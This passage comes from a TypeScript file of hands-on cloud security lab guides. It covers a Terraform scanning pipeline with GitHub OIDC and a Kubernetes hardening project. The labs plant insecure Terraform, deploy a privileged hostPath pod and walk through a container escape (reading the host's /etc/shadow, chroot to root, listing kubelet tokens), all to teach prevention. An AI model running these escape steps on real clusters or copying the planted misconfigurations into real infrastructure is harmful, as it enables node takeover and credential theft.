        "The document saying who may assume a role. For OIDC it names the identity provider and, critically, which repository and branch.",
    },
    {
      term: "Confused deputy",
      plain:
        "When a trusted system is tricked into acting for someone else. An OIDC trust policy that does not pin the repository is exactly this bug — any GitHub repo could assume your role.",
    },
  ],
  before: [
    "<b>Project 01 finished</b>, plus a GitHub account.",
    "Terraform installed.",
    "About 6 hours.",
  ],
  steps: [
    {
      title: "Create a repo with deliberately insecure Terraform",
      time: "30 min",
      why: "You need something for the scanner to find. Writing the bad code yourself means you know exactly what a correct scan should report.",
      body: "<p>Set up the repository and a Terraform file containing several classic mistakes.</p>",
      commands: [
        {
          lang: "bash",
          label: "Scaffold",
          code: "mkdir -p secure-pipeline/{terraform,.github/workflows} && cd secure-pipeline\ngit init\n\ncat > .gitignore <<'EOF'\n.terraform/\n*.tfstate\n*.tfstate.*\n*.tfvars\n.env\nEOF",
        },
        {
          lang: "hcl",
          label: "terraform/main.tf — deliberately insecure",
          code: "terraform {\n  required_providers {\n    aws = { source = \"hashicorp/aws\", version = \"~> 5.0\" }\n  }\n}\n\nprovider \"aws\" {\n  region = \"us-east-1\"\n}\n\n# PROBLEM 1: no encryption, no versioning, no public access block\nresource \"aws_s3_bucket\" \"data\" {\n  bucket = \"pipeline-lab-data-bucket-changeme\"\n}\n\n# PROBLEM 2: SSH open to the entire internet\nresource \"aws_security_group\" \"web\" {\n  name        = \"web-sg\"\n  description = \"web server\"\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n\n  egress {\n    from_port   = 0\n    to_port     = 0\n    protocol    = \"-1\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n\n# PROBLEM 3: wildcard IAM policy\nresource \"aws_iam_policy\" \"app\" {\n  name = \"app-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect   = \"Allow\"\n      Action   = \"*\"\n      Resource = \"*\"\n    }]\n  })\n}",
        },
      ],
      expect: "<p>A repository with three planted misconfigurations.</p>",
    },
    {
      title: "Scan it locally first",
      time: "35 min",
      why: "Run the scanner locally before wiring it into CI. Debugging a scanner inside a pipeline is far slower than debugging it on your laptop.",
      body: "<p><b>Checkov</b> and <b>tfsec</b>/<b>Trivy</b> are the two common choices. Run both — they catch overlapping but different things.</p>",
      commands: [
        {
          lang: "bash",
          label: "Checkov",
          code: "pip install checkov\ncheckov -d terraform/ --compact --quiet",
        },
        {
          lang: "bash",
          label: "Trivy (which absorbed tfsec)",
          code: "# macOS: brew install trivy\n# Linux:\ncurl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh |\n  sudo sh -s -- -b /usr/local/bin\n\ntrivy config terraform/",
        },
      ],
      expect:
        "<p>Both find your three problems, plus extras you did not plant — missing bucket logging, no lifecycle policy, and so on. Note the difference between the two tools' output; that is why teams often run more than one.</p>",
      expectCode:
        "Check: CKV_AWS_260: \"Ensure no security groups allow ingress from 0.0.0.0:0 to port 22\"\n\tFAILED for resource: aws_security_group.web\n\nCheck: CKV_AWS_19: \"Ensure all data stored in the S3 bucket is securely encrypted at rest\"\n\tFAILED for resource: aws_s3_bucket.data\n\nPassed checks: 4, Failed checks: 11, Skipped checks: 0",
      fixes: [
        {
          problem: "Checkov reports zero checks run",
          cause: "It was pointed at a directory containing no <code>.tf</code> files.",
          fix: "Run from the repository root with <code>-d terraform/</code>, and confirm the file exists with <code>ls terraform/</code>.",
        },
      ],
    },
    {
      title: "Fix the Terraform",
      time: "45 min",
      why: "Fixing it teaches what each finding actually meant — and gives you a secure baseline the pipeline can protect.",
      body: "<p>Rewrite the resources properly.</p>",
      commands: [
        {
          lang: "hcl",
          label: "terraform/main.tf — secured",
          code: "resource \"aws_s3_bucket\" \"data\" {\n  bucket = \"pipeline-lab-data-bucket-changeme\"\n}\n\nresource \"aws_s3_bucket_server_side_encryption_configuration\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n  rule {\n    apply_server_side_encryption_by_default {\n      sse_algorithm = \"AES256\"\n    }\n    bucket_key_enabled = true\n  }\n}\n\nresource \"aws_s3_bucket_versioning\" \"data\" {\n  bucket = aws_s3_bucket.data.id\n  versioning_configuration { status = \"Enabled\" }\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"data\" {\n  bucket                  = aws_s3_bucket.data.id\n  block_public_acls       = true\n  block_public_policy     = true\n  ignore_public_acls      = true\n  restrict_public_buckets = true\n}\n\n# SSH restricted to a known range rather than the internet\nvariable \"admin_cidr\" {\n  description = \"CIDR permitted to reach SSH\"\n  type        = string\n}\n\nresource \"aws_security_group\" \"web\" {\n  name        = \"web-sg\"\n  description = \"web server security group\"\n\n  ingress {\n    description = \"SSH from admin network only\"\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = [var.admin_cidr]\n  }\n\n  egress {\n    description = \"HTTPS out\"\n    from_port   = 443\n    to_port     = 443\n    protocol    = \"tcp\"\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}\n\n# Scoped IAM policy instead of a wildcard\nresource \"aws_iam_policy\" \"app\" {\n  name = \"app-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [{\n      Effect = \"Allow\"\n      Action = [\"s3:GetObject\", \"s3:PutObject\"]\n      Resource = \"${aws_s3_bucket.data.arn}/*\"\n    }]\n  })\n}",
        },
        {
          lang: "bash",
          label: "Re-scan",
          code: "checkov -d terraform/ --compact --quiet",
        },
      ],
      expect:
        "<p>Failures drop sharply. Some will remain — bucket access logging, for instance. Decide deliberately: fix it, or suppress it with a documented reason using an inline <code>#checkov:skip=CKV_AWS_18:reason</code> comment. Suppression with a reason is professional; leaving a permanent failing check is not.</p>",
    },
    {
      title: "Set up OIDC — no stored credentials",
      time: "50 min",
      why: "This is the centrepiece. Static AWS keys in CI are a standing risk: they do not expire, they are visible to anyone with repo admin, and they are a favourite target in supply-chain attacks.",
      body: "<p>Register GitHub as an identity provider in AWS, then create a role only your repository can assume.</p>",
      commands: [
        {
          lang: "bash",
          label: "Register GitHub as an OIDC provider",
          code: "aws iam create-open-id-connect-provider \\\n  --url https://token.actions.githubusercontent.com \\\n  --client-id-list sts.amazonaws.com \\\n  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1",
        },
        {
          lang: "bash",
          label: "The trust policy — note the repo pinning",
          code: "ACCT=$(aws sts get-caller-identity --query Account --output text)\nGH_USER=your-github-username\nGH_REPO=secure-pipeline\n\ncat > oidc-trust.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Principal\": {\n      \"Federated\": \"arn:aws:iam::$ACCT:oidc-provider/token.actions.githubusercontent.com\"\n    },\n    \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n    \"Condition\": {\n      \"StringEquals\": {\n        \"token.actions.githubusercontent.com:aud\": \"sts.amazonaws.com\"\n      },\n      \"StringLike\": {\n        \"token.actions.githubusercontent.com:sub\": \"repo:$GH_USER/$GH_REPO:ref:refs/heads/main\"\n      }\n    }\n  }]\n}\nEOF\n\naws iam create-role --role-name GitHubActionsDeploy \\\n  --assume-role-policy-document file://oidc-trust.json",
        },
      ],
      warn: "The <code>sub</code> condition is the security control. Without it — or with <code>\"sub\": \"*\"</code> — <b>any</b> GitHub repository in the world could assume your role. That is the confused deputy problem, and it is a real misconfiguration people ship.",
      expect: "<p>The provider and role exist, with the trust scoped to one repository and one branch.</p>",
      expectCode:
        "$ aws iam get-role --role-name GitHubActionsDeploy \\\n    --query 'Role.AssumeRolePolicyDocument.Statement[0].Condition'\n{\n  \"StringLike\": {\n    \"token.actions.githubusercontent.com:sub\": \"repo:you/secure-pipeline:ref:refs/heads/main\"\n  }\n}",
      fixes: [
        {
          problem: "EntityAlreadyExists on create-open-id-connect-provider",
          cause: "It is already registered — the provider is account-wide, not per-repo.",
          fix: "Harmless. List it with <code>aws iam list-open-id-connect-providers</code> and carry on.",
        },
      ],
    },
    {
      title: "Grant the role only what it needs",
      time: "20 min",
      body: "<p>Apply the least-privilege thinking from project 03: this role deploys specific resources, so scope it to those.</p>",
      commands: [
        {
          lang: "bash",
          code: "cat > deploy-policy.json <<EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:CreateBucket\", \"s3:PutBucketVersioning\",\n        \"s3:PutEncryptionConfiguration\", \"s3:PutBucketPublicAccessBlock\",\n        \"s3:GetBucket*\", \"s3:ListBucket\"\n      ],\n      \"Resource\": \"arn:aws:s3:::pipeline-lab-*\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\"ec2:CreateSecurityGroup\", \"ec2:AuthorizeSecurityGroup*\",\n                 \"ec2:DescribeSecurityGroups\", \"ec2:CreateTags\"],\n      \"Resource\": \"*\"\n    },\n    {\n      \"Effect\": \"Deny\",\n      \"Action\": [\"iam:CreateUser\", \"iam:CreateAccessKey\", \"iam:AttachUserPolicy\"],\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n\naws iam put-role-policy --role-name GitHubActionsDeploy \\\n  --policy-name DeployPermissions \\\n  --policy-document file://deploy-policy.json",
        },
      ],
      expect:
        "<p>Note the explicit Deny on IAM user creation. If the pipeline is ever compromised, the attacker cannot use it to create themselves a persistent identity — the blast radius is bounded.</p>",
    },
    {
      title: "Write the workflow",
      time: "45 min",
      body: "<p>Scan on every pull request; deploy only from main, using OIDC.</p>",
      commands: [
        {
          lang: "yaml",
          label: ".github/workflows/pipeline.yml",
          code: "name: Terraform security pipeline\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\n# Least privilege for the workflow token itself\npermissions:\n  contents: read\n  id-token: write        # required for OIDC\n  pull-requests: write   # to comment scan results\n\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Terraform format and validate\n        run: |\n          terraform -chdir=terraform init -backend=false\n          terraform -chdir=terraform fmt -check\n          terraform -chdir=terraform validate\n\n      - name: Checkov\n        uses: bridgecrewio/checkov-action@master\n        with:\n          directory: terraform/\n          framework: terraform\n          soft_fail: false        # a failing check blocks the merge\n\n      - name: Trivy config scan\n        uses: aquasecurity/trivy-action@master\n        with:\n          scan-type: config\n          scan-ref: terraform/\n          exit-code: '1'\n          severity: 'CRITICAL,HIGH'\n\n      - name: Secret scan\n        uses: gitleaks/gitleaks-action@v2\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n\n  deploy:\n    needs: scan\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      # No stored keys — AWS issues short-lived credentials to this run\n      - name: Configure AWS credentials via OIDC\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::ACCOUNT_ID:role/GitHubActionsDeploy\n          aws-region: us-east-1\n\n      - name: Prove who we are\n        run: aws sts get-caller-identity\n\n      - name: Terraform plan\n        run: |\n          terraform -chdir=terraform init\n          terraform -chdir=terraform plan -var=\"admin_cidr=203.0.113.0/24\"",
        },
        {
          lang: "bash",
          label: "Push it",
          code: "sed -i \"s/ACCOUNT_ID/$ACCT/\" .github/workflows/pipeline.yml\n\ngit add -A\ngit commit -m \"Secure Terraform pipeline with IaC scanning and OIDC\"\ngit branch -M main\ngit remote add origin https://github.com/$GH_USER/$GH_REPO.git\ngit push -u origin main",
        },
      ],
      expect:
        "<p>The Actions tab shows the scan job passing and the deploy job successfully calling <code>get-caller-identity</code> as the assumed role — with no secret configured anywhere in the repository.</p>",
      expectCode:
        "Run aws sts get-caller-identity\n{\n    \"Arn\": \"arn:aws:sts::123456789012:assumed-role/GitHubActionsDeploy/GitHubActions\"\n}",
      fixes: [
        {
          problem: "\"Not authorized to perform sts:AssumeRoleWithWebIdentity\"",
          cause:
            "Almost always the <code>sub</code> condition not matching. It is exact — branch name, repo name, and owner all have to be right.",
          fix: "Print the actual subject from the workflow and compare: add a step running <code>echo \"repo:${{ github.repository }}:ref:${{ github.ref }}\"</code>. For pull requests the subject is <code>pull_request</code>, not a branch ref — which is why deploy is gated to main.",
        },
        {
          problem: "\"Missing id-token: write permission\"",
          cause: "The workflow cannot request an OIDC token.",
          fix: "The <code>permissions:</code> block at the top of the file grants it. It must be present at workflow or job level.",
        },
      ],
    },
    {
      title: "Prove the pipeline blocks bad code",
      time: "30 min",
      why: "A control you have not tested is a control you are hoping works. Try to merge something insecure and watch it fail.",
      body: "<p>Open a pull request that reintroduces a problem.</p>",
      commands: [
        {
          lang: "bash",
          code: "git checkout -b test-insecure\n\ncat >> terraform/main.tf <<'EOF'\n\nresource \"aws_security_group_rule\" \"bad\" {\n  type              = \"ingress\"\n  from_port         = 3389\n  to_port           = 3389\n  protocol          = \"tcp\"\n  cidr_blocks       = [\"0.0.0.0/0\"]\n  security_group_id = aws_security_group.web.id\n}\nEOF\n\ngit commit -am \"Open RDP to the world (this should be blocked)\"\ngit push -u origin test-insecure\n# then open the pull request on GitHub",
        },
      ],
      expect:
        "<p>The scan job fails and the pull request shows a red check. That screenshot — a blocked insecure change — is the single best artefact from this project.</p>",
      expectCode:
        "Check: CKV_AWS_25: \"Ensure no security groups allow ingress from 0.0.0.0:0 to port 3389\"\n\tFAILED for resource: aws_security_group_rule.bad\n\nError: Process completed with exit code 1.",
    },
    {
      title: "Clean up",
      time: "15 min",
      body: "<p>The pipeline only ran <code>plan</code>, so little should exist — but verify rather than assume.</p>",
      commands: [
        {
          lang: "bash",
          code: "aws s3 ls | grep pipeline-lab || echo 'no buckets created'\naws ec2 describe-security-groups \\\n  --filters Name=group-name,Values=web-sg \\\n  --query 'SecurityGroups[].GroupId' --output text\n\n# Keep the OIDC provider and role — they cost nothing and are reusable.\n# To remove entirely:\n# aws iam delete-role-policy --role-name GitHubActionsDeploy --policy-name DeployPermissions\n# aws iam delete-role --role-name GitHubActionsDeploy",
        },
      ],
      expect: "<p>Nothing billable left. Keep the OIDC setup — it is free and you will reuse it.</p>",
    },
  ],
  after: [
    "Replace any static AWS keys you have in other CI systems with OIDC. Every major CI platform supports it now.",
    "Add <code>terraform plan</code> output as a PR comment so reviewers see the actual diff rather than trusting the code.",
    "Read about the confused deputy problem properly — misconfigured OIDC trust policies are a live, exploited issue, not a theoretical one.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 08 — Container and Kubernetes hardening                                     */
/* -------------------------------------------------------------------------- */

export const c08: ProjectGuide = {
  slug: "kubernetes-hardening",
  projectId: 8,
  intro:
    "<p>Containers are where a lot of cloud compromise actually happens, and the failure mode is consistent: a pod runs with more privilege than it needs, an attacker gets code execution inside it, and that privilege lets them reach the host or the cloud account.</p><p>You are going to demonstrate the escape yourself on a deliberately misconfigured pod, then make it impossible at admission — so that the same pod specification is rejected before it ever runs.</p><p>The important shift here is from &ldquo;detect bad pods&rdquo; to &ldquo;refuse bad pods&rdquo;. Admission control is the cloud-native version of the preventive-over-detective lesson from project 02.</p>",
  glossary: [
    {
      term: "Container",
      plain:
        "A process isolated from the rest of the machine using kernel features. Lighter than a VM, and the isolation is weaker — which is the whole security story.",
    },
    {
      term: "Pod",
      plain: "Kubernetes' unit of deployment — one or more containers that share a network namespace.",
    },
    {
      term: "Privileged container",
      plain:
        "A container running with <code>privileged: true</code>, which disables most isolation. Practically equivalent to root on the host.",
    },
    {
      term: "hostPath volume",
      plain:
        "Mounting a directory from the host node into the pod. Mounting <code>/</code> means the pod can read and write the entire node filesystem.",
    },
    {
      term: "Admission controller",
      plain:
        "Code that inspects every resource before it is created and can reject it. This is where prevention happens in Kubernetes.",
    },
    {
      term: "Pod Security Standards",
      plain:
        "Kubernetes' built-in policy levels — privileged, baseline, restricted. Enforced with a namespace label, which makes them the cheapest possible win.",
    },
  ],
  before: [
    "<b>Project 01 finished.</b>",
    "<code>kubectl</code> installed (<code>kubectl version --client</code>).",
    "About 8 hours.",
  ],
  steps: [
    {
      title: "Understand the cost, and choose your cluster",
      time: "15 min",
      warn: "Managed Kubernetes is <b>not</b> free tier. EKS costs about $0.10/hour for the control plane alone — roughly $2.40/day — plus nodes. Budget a few dollars and destroy it the same day.",
      why: "This is the most expensive project in the kit, and there is a free alternative that covers most of the learning.",
      body: "<p>Two paths, and the free one is genuinely fine for most of this guide:</p><ul><li><b>Free — kind or minikube on your laptop.</b> Every step works except the cloud-identity integration in step 7.</li><li><b>Paid — EKS/AKS/GKE.</b> Needed only if you want the full workload-identity story.</li></ul><p>Start with kind. Move to managed only if you specifically want step 7.</p>",
      commands: [
        {
          lang: "bash",
          label: "Free path — kind",
          code: "# macOS: brew install kind\n# Linux:\ncurl -Lo ./kind https://kind.sigs.k8s.io/dl/latest/kind-linux-amd64\nchmod +x ./kind && sudo mv ./kind /usr/local/bin/kind\n\nkind create cluster --name hardening-lab\nkubectl cluster-info --context kind-hardening-lab",
        },
        {
          lang: "bash",
          label: "Paid path — EKS (remember the teardown)",
          code: "# eksctl makes this one command, but it takes ~20 minutes\neksctl create cluster --name hardening-lab \\\n  --region us-east-1 --nodes 2 --node-type t3.small --managed\n\n# DESTROY THE SAME DAY:\n# eksctl delete cluster --name hardening-lab --region us-east-1",
        },
      ],
      expect: "<p>A working cluster.</p>",
      expectCode:
        "Kubernetes control plane is running at https://127.0.0.1:6443\nCoreDNS is running at https://127.0.0.1:6443/api/v1/namespaces/kube-system/...",
    },
    {
      title: "Deploy the deliberately dangerous pod",
      time: "25 min",
      warn: "Lab cluster only. This pod can take over its node.",
      why: "Seeing the escape work is what makes the hardening meaningful. Reading about <code>hostPath: /</code> does not land the same way.",
      body: "<p>Create a pod with every dangerous setting turned on.</p>",
      commands: [
        {
          lang: "yaml",
          label: "insecure-pod.yaml",
          code: "apiVersion: v1\nkind: Pod\nmetadata:\n  name: insecure-demo\n  namespace: default\nspec:\n  hostNetwork: true      # sees the node's network\n  hostPID: true          # sees the node's processes\n  containers:\n    - name: shell\n      image: alpine:3.19\n      command: [\"sleep\", \"3600\"]\n      securityContext:\n        privileged: true            # disables isolation\n        runAsUser: 0                # root\n        allowPrivilegeEscalation: true\n      volumeMounts:\n        - name: host-root\n          mountPath: /host          # the entire node filesystem\n  volumes:\n    - name: host-root\n      hostPath:\n        path: /",
        },
        {
          lang: "bash",
          code: "kubectl apply -f insecure-pod.yaml\nkubectl get pod insecure-demo",
        },
      ],
      expect:
        "<p>The pod is <code>Running</code>. Note that Kubernetes accepted it without complaint — by default, nothing stops this.</p>",
      expectCode: "NAME            READY   STATUS    RESTARTS   AGE\ninsecure-demo   1/1     Running   0          8s",
    },
    {
      title: "Escape the container",
      time: "40 min",
      why: "Demonstrating the impact yourself is what turns an abstract policy into an obvious requirement.",
      body: "<p>Get a shell in the pod and use each misconfiguration in turn.</p>",
      commands: [
        {
          lang: "bash",
          label: "Read the host filesystem",
          code: "kubectl exec -it insecure-demo -- sh\n\n# Inside the pod:\nls /host\ncat /host/etc/shadow | head -3\ncat /host/etc/kubernetes/manifests/kube-apiserver.yaml 2>/dev/null | head -20",
        },
        {
          lang: "bash",
          label: "See every process on the node",
          code: "# Still inside the pod — hostPID makes this possible\nps aux | head -20\n\n# Node's network too, thanks to hostNetwork\nnetstat -tlnp 2>/dev/null | head",
        },
        {
          lang: "bash",
          label: "Full escape — chroot into the host",
          code: "# privileged + hostPath / = you are root on the node\nchroot /host /bin/sh\n\n# You are now on the node itself, not in the container:\nhostname\nls /var/lib/kubelet/\n\n# And you can read every secret the node holds:\nls /var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/ 2>/dev/null | head",
        },
      ],
      expect:
        "<p>You are root on the node with access to its filesystem, processes, network, and every service account token mounted on it. Four YAML lines produced total compromise — that is the finding.</p>",
      expectCode:
        "/ # chroot /host /bin/sh\n/ # hostname\nhardening-lab-control-plane\n/ # cat /etc/shadow | head -1\nroot:*:19000:0:99999:7:::",
      fixes: [
        {
          problem: "chroot: can't execute '/bin/sh': No such file or directory",
          cause: "The node image has a different shell path.",
          fix: "Try <code>chroot /host /bin/bash</code>, or just browse <code>/host</code> directly — the point is made either way.",
        },
      ],
    },
    {
      title: "Turn on Pod Security Standards",
      time: "40 min",
      why: "This is the cheapest, highest-value control in Kubernetes. It is built in, it needs no extra software, and it is a namespace label.",
      body: "<p>The <code>restricted</code> profile blocks essentially everything you just exploited.</p>",
      commands: [
        {
          lang: "bash",
          label: "Enforce restricted on a namespace",
          code: "kubectl create namespace secure-apps\n\nkubectl label namespace secure-apps \\\n  pod-security.kubernetes.io/enforce=restricted \\\n  pod-security.kubernetes.io/enforce-version=latest \\\n  pod-security.kubernetes.io/warn=restricted \\\n  pod-security.kubernetes.io/audit=restricted",
        },
        {
          lang: "bash",
          label: "Try to deploy the same insecure pod there — it must be REJECTED",
          code: "sed 's/namespace: default/namespace: secure-apps/' insecure-pod.yaml |\n  kubectl apply -f -",
        },
      ],
      expect:
        "<p>Rejected at admission, with every violation listed. The pod never existed — this is prevention, not detection, and the error message doubles as documentation of what was wrong.</p>",
      expectCode:
        "Error from server (Forbidden): error when creating \"STDIN\": pods \"insecure-demo\"\nis forbidden: violates PodSecurity \"restricted:latest\":\n  host namespaces (hostNetwork=true, hostPID=true),\n  privileged (container \"shell\" must not set securityContext.privileged=true),\n  allowPrivilegeEscalation != false,\n  unrestricted capabilities,\n  restricted volume types (volume \"host-root\" uses restricted volume type \"hostPath\"),\n  runAsNonRoot != true,\n  seccompProfile",
      fixes: [
        {
          problem: "The pod is created anyway",
          cause: "Pod Security admission requires Kubernetes 1.25+.",
          fix: "Check with <code>kubectl version</code>. On older clusters use the OPA Gatekeeper approach in step 6 instead.",
        },
      ],
    },
    {
      title: "Write a pod that actually passes",
      time: "45 min",
      why: "Blocking insecure pods is only useful if people can still ship working ones. Writing the compliant version is the other half of the job.",
      body: "<p>Build a pod specification that satisfies <code>restricted</code>.</p>",
      commands: [
        {
          lang: "yaml",
          label: "secure-pod.yaml",
          code: "apiVersion: v1\nkind: Pod\nmetadata:\n  name: secure-demo\n  namespace: secure-apps\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 10001\n    runAsGroup: 10001\n    fsGroup: 10001\n    seccompProfile:\n      type: RuntimeDefault\n  containers:\n    - name: app\n      image: nginxinc/nginx-unprivileged:1.25-alpine\n      ports:\n        - containerPort: 8080\n      securityContext:\n        allowPrivilegeEscalation: false\n        readOnlyRootFilesystem: true\n        capabilities:\n          drop: [\"ALL\"]\n      resources:\n        requests: { cpu: 50m, memory: 64Mi }\n        limits:   { cpu: 200m, memory: 128Mi }\n      volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: cache\n          mountPath: /var/cache/nginx\n  volumes:\n    - name: tmp\n      emptyDir: {}\n    - name: cache\n      emptyDir: {}",
        },
        {
          lang: "bash",
          code: "kubectl apply -f secure-pod.yaml\nkubectl get pod -n secure-apps secure-demo\n\n# Confirm the hardening is real\nkubectl exec -n secure-apps secure-demo -- id\nkubectl exec -n secure-apps secure-demo -- touch /test 2>&1 | head -1",
        },
      ],
      expect:
        "<p>Running as UID 10001 with a read-only root filesystem — the write attempt fails. Note the image choice: the standard <code>nginx</code> image needs root to bind port 80, so a compliant pod needs the unprivileged variant. That kind of practical detail is what makes hardening land or fail in practice.</p>",
      expectCode:
        "uid=10001 gid=10001 groups=10001\n\ntouch: /test: Read-only file system",
      fixes: [
        {
          problem: "CreateContainerConfigError",
          cause: "The image requires root and cannot start as a non-root user.",
          fix: "Use an image built for it — <code>nginxinc/nginx-unprivileged</code>, or add a <code>USER</code> directive to your own Dockerfile. This is the most common blocker when rolling out restricted policies.",
        },
      ],
    },
    {
      title: "Add custom policy with Gatekeeper",
      time: "50 min",
      why: "Pod Security Standards cover the standard cases. Organisation-specific rules — approved registries, required labels — need a policy engine.",
      body: "<p>Install OPA Gatekeeper and write a rule that only allows images from approved registries.</p>",
      commands: [
        {
          lang: "bash",
          label: "Install Gatekeeper",
          code: "kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.15/deploy/gatekeeper.yaml\n\nkubectl -n gatekeeper-system wait --for=condition=Ready pod --all --timeout=180s",
        },
        {
          lang: "yaml",
          label: "constraint-template.yaml",
          code: "apiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8sallowedrepos\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sAllowedRepos\n      validation:\n        openAPIV3Schema:\n          type: object\n          properties:\n            repos:\n              type: array\n              items:\n                type: string\n  targets:\n    - target: admission.k8s.gatekeeper.sh\n      rego: |\n        package k8sallowedrepos\n\n        violation[{\"msg\": msg}] {\n          container := input.review.object.spec.containers[_]\n          satisfied := [good | repo = input.parameters.repos[_]\n                               good = startswith(container.image, repo)]\n          not any(satisfied)\n          msg := sprintf(\"image '%v' is not from an approved registry %v\",\n                         [container.image, input.parameters.repos])\n        }",
        },
        {
          lang: "yaml",
          label: "constraint.yaml",
          code: "apiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sAllowedRepos\nmetadata:\n  name: only-approved-registries\nspec:\n  match:\n    kinds:\n      - apiGroups: [\"\"]\n        kinds: [\"Pod\"]\n    namespaces: [\"secure-apps\"]\n  parameters:\n    repos:\n      - \"nginxinc/\"\n      - \"public.ecr.aws/\"\n      - \"registry.k8s.io/\"",
        },
        {
          lang: "bash",
          label: "Apply and test",
          code: "kubectl apply -f constraint-template.yaml\nsleep 10\nkubectl apply -f constraint.yaml\nsleep 5\n\n# This should be rejected — alpine is not on the list\nkubectl run test-blocked -n secure-apps --image=alpine:3.19 -- sleep 30",
        },
      ],
      expect:
        "<p>Rejection naming your policy. You now have two admission layers: the built-in standards, and organisation-specific rules on top.</p>",
      expectCode:
        "Error from server (Forbidden): admission webhook \"validation.gatekeeper.sh\"\ndenied the request: [only-approved-registries] image 'alpine:3.19' is not from\nan approved registry [\"nginxinc/\" \"public.ecr.aws/\" \"registry.k8s.io/\"]",
      fixes: [
        {
          problem: "The constraint has no effect",
          cause: "The template must be fully registered before the constraint referencing it is applied.",
          fix: "The <code>sleep</code> commands handle this. Check registration with <code>kubectl get constrainttemplate</code>.",
        },
      ],
    },
    {
      title: "Scan the images too",
      time: "35 min",
      why: "A perfectly configured pod running a container full of known vulnerabilities is still a problem. Configuration and content are separate concerns.",
      body: "<p>Scan your images with Trivy and see what the base image alone brings with it.</p>",
      commands: [
        {
          lang: "bash",
          code: "trivy image --severity HIGH,CRITICAL nginxinc/nginx-unprivileged:1.25-alpine\n\n# Compare against a deliberately old image\ntrivy image --severity HIGH,CRITICAL nginx:1.14\n\n# Scan everything currently running\nkubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' |\n  tr ' ' '\\n' | sort -u |\n  while read -r img; do\n    echo \"=== $img\"\n    trivy image --severity CRITICAL --quiet \"$img\" 2>/dev/null | tail -5\n  done",
        },
      ],
      expect:
        "<p>The old image has dozens of critical vulnerabilities; the current Alpine-based one has very few. That comparison is the argument for base-image currency, and it is more persuasive than any policy document.</p>",
    },
    {
      title: "Tear the cluster down",
      time: "10 min",
      warn: "If you used EKS/AKS/GKE, do this now. A managed control plane bills whether or not you are using it.",
      body: "<p>Destroy and verify.</p>",
      commands: [
        {
          lang: "bash",
          code: "# kind\nkind delete cluster --name hardening-lab\n\n# EKS\n# eksctl delete cluster --name hardening-lab --region us-east-1\n\n# Verify nothing survived (EKS)\naws eks list-clusters\naws ec2 describe-instances \\\n  --filters Name=instance-state-name,Values=running \\\n  --query 'Reservations[].Instances[].InstanceId'",
        },
      ],
      expect:
        "<p>No clusters, no running instances. For EKS specifically, also check for orphaned load balancers and NAT gateways — cluster deletion does not always remove them, and they are the expensive leftovers.</p>",
    },
  ],
  after: [
    "Check tomorrow's bill if you used a managed cluster.",
    "Read the NSA/CISA Kubernetes Hardening Guidance — free, thorough, and it maps closely to what you just built.",
    "Try the same escape against the <code>baseline</code> profile rather than <code>restricted</code>, and note what still gets through. The gap between those two profiles is worth understanding.",
  ],
};
